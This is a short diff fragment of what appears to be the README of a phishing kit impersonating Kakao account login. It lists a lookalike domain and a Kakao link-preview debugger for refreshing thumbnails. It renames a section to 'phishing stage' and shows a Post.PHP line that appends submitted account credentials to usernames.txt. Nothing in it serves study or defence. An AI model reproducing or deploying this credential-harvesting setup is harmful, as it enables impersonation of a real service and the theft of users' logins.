@@ -23,7 +23,7 @@ https://accountkakao.works/
 # 빠른 썸네일 반영
 https://developers.kakao.com/tool/debugger/sharing
 ```
-## 계정 정보 저장
+## 피싱 단계
 ```
 Post.PHP
 $handle=fopen("usernames.txt","a"); 입력된 계정 정보를 usernames.txt에 저장 
